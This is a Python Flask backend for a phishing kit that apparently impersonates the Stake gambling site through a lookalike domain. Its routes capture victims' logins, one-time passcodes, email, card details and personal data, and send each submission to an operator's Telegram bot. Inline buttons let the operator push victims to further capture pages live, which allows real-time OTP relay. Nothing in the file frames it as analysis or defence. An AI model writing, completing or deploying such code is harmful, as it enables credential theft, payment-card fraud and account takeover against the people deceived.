from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import uuid
import requests
import time
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

# 🔥 CHANGE THIS TO YOUR REAL DOMAIN
BASE_URL = "https://stake-vips.comé"

if not BOT_TOKEN or not CHAT_ID:
    raise RuntimeError("Missing BOT_TOKEN or CHAT_ID")

SESSION_STATUS = {}

PAGES = [
    {"emoji": "🔐", "text": "LOGIN1", "page": "index.html"},
    {"emoji": "🔢", "text": "OTP", "page": "otp.html"},
    {"emoji": "📧", "text": "EMAIL", "page": "email.html"},
    {"emoji": "🧾", "text": "CARD", "page": "c.html"},
    {"emoji": "🧍", "text": "PERSONAL", "page": "personal.html"},
    {"emoji": "🔑", "text": "LOGIN2", "page": "login2.html"},
    {"emoji": "🎉", "text": "THANK YOU", "page": "thnks.html"},
]

# ======================
# TELEGRAM
# ======================
def send_to_telegram(data, session_id, type_):
    msg = f"<b>🔐 {type_.upper()} Submission</b>\n\n"

    for k, v in data.items():
        msg += f"<b>{k}:</b> <code>{v}</code>\n"

    msg += f"\n<b>Session:</b> <code>{session_id}</code>"

    keyboard = [[
        {"text": f"{b['emoji']} {b['text']}", "callback_data": f"{session_id}:{b['page']}"}
    ] for b in PAGES]

    payload = {
        "chat_id": CHAT_ID,
        "text": msg,
        "parse_mode": "HTML",
        "reply_markup": {"inline_keyboard": keyboard}
    }

    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json=payload)
    except:
        pass


# ======================
# LOGIN (CREATE SESSION)
# ======================
@app.route("/login", methods=["POST"])
def login():
    data = request.get_json()

    session_id = str(uuid.uuid4())

    SESSION_STATUS[session_id] = {
        "approved": False,
        "redirect_url": None
    }

    send_to_telegram(data, session_id, "login")

    return jsonify({"success": True, "id": session_id})


# ======================
# REUSE SESSION (OTP ETC)
# ======================
def handle_step(step_name):
    data = request.get_json()
    session_id = data.get("session_id")

    if not session_id or session_id not in SESSION_STATUS:
        return jsonify({"error": "invalid session"}), 400

    send_to_telegram(data, session_id, step_name)

    return jsonify({"success": True})


@app.route("/otp", methods=["POST"])
def otp():
    return handle_step("otp")

@app.route("/email", methods=["POST"])
def email():
    return handle_step("email")

@app.route("/c", methods=["POST"])
def c():
    return handle_step("card")

@app.route("/personal", methods=["POST"])
def personal():
    return handle_step("personal")

@app.route("/login2", methods=["POST"])
def login2():
    return handle_step("login2")

@app.route("/thnks", methods=["POST"])
def thnks():
    return handle_step("thnks")


# ======================
# TELEGRAM BUTTON CLICK
# ======================
@app.route("/webhook", methods=["POST"])
def webhook():
    update = request.get_json()

    if "callback_query" not in update:
        return "ok"

    data = update["callback_query"]["data"]
    session_id, page = data.split(":")

    if session_id in SESSION_STATUS:
        SESSION_STATUS[session_id]["approved"] = True
        SESSION_STATUS[session_id]["redirect_url"] = f"{BASE_URL}/{page}"

    return "ok"


# ======================
# FRONTEND CHECK
# ======================
@app.route("/status/<session_id>")
def status(session_id):
    session = SESSION_STATUS.get(session_id)

    if not session:
        return jsonify({"error": "not found"}), 404

    if session["approved"]:
        return jsonify({
            "status": "approved",
            "redirect_url": session["redirect_url"]
        })

    return jsonify({"status": "pending"})


# ======================
# HEALTH
# ======================
@app.route("/")
def home():
    return "✅ LIVE"


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
